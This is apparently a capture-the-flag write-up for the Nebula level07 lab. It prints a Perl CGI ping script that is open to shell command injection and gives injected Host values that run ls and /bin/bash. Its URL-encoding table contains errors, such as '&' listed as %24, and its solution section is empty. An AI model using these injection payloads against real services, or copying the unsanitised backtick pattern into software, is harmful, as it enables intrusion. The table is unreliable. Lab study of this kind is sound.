Question URL: https://exploit.education/nebula/level-07/

Source Code:(index.cgi)
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc
ping(param("Host"));


Information gathering:
a. httpd is running as flag07
level07@nebula:/home/flag07$ ps -ef | grep http
flag07    1383     1  0 03:34 ?        00:00:00 /usr/sbin/thttpd -C /home/flag07/thttpd.conf

b. Paramter can be passed into CGI program. On the above source code, index.cgi receives Host parameter as URL parameter type
CGI receives parameter through URL with the format of "index.cgi?name=value&name2=value2&..."
e.g.) http://192.168.10.133:7007/index.cgi?Host=www.google.com <= Host will be fed with www.google.com

c. As you can see, we can pass any commands to cgi program as a passing Host value
http://192.168.10.133:7007/index.cgi?Host=;/bin/bash <== This will be replaced like ping -c 3 ;/bin/bash 

d. Test cgi file with parameter through CLI
level07@nebula:/home/flag07$ ./index.cgi Host=localhost
Content-type: text/html

<html><head><title>Ping results</title></head><body><pre>PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=0.016 ms
64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=0.034 ms
64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=0.031 ms

--- localhost ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.016/0.027/0.034/0.007 ms
</pre></body></html>


level07@nebula:/home/flag07$ ./index.cgi Host=localhost%3Bls
Content-type: text/html

<html><head><title>Ping results</title></head><body><pre>PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=0.018 ms
64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=0.034 ms
64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=0.104 ms

--- localhost ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.018/0.052/0.104/0.037 ms
index.cgi
thttpd.conf
</pre></body></html>level07@nebula:/home/flag07$


Lesson learned:
a. URL encoding needed
- When you send Unix commands as cgi parameter and your unix commands include special characters (special meaning with Internet browsers),
you MUST encode those special characters.
** Note: If the characters in URL is actual HTML codes, it SHOULD NOT be encoded. e.g. &amp <= & shouldn't be encoded as "%24amp" **

Reserved Characters URL Encoding

Character	        Purpose in URL  	                    Encoding
===========   =======================================   ========
  ;(semicolon) Separate protocol (http) from address	    %3B
  /	           Separate domain and directories	          %2F
  #	           Separate anchors	                          %23
  ?	           Separate query string	                    %3F
  &	           Separate query elements	                  %24
  @	           Separate username and password from domain	%40
  %	           Indicates an encoded character	            %25
  +	           Indicates a space	                        %2B
 <space>	     Not recommended in URLs	                  %20 or +
====================================================================
e.g.) 
Commands to send: /bin/bash
http://192.168.10.133:7007/index.cgi?Host=localhost%3B%2Fbin%2Fbash 
** Special characters used as its original meaning with Browserd should not be encoded. Above example, ? is used as its original special
meaning which is "separating query string"



Sol.
a. 
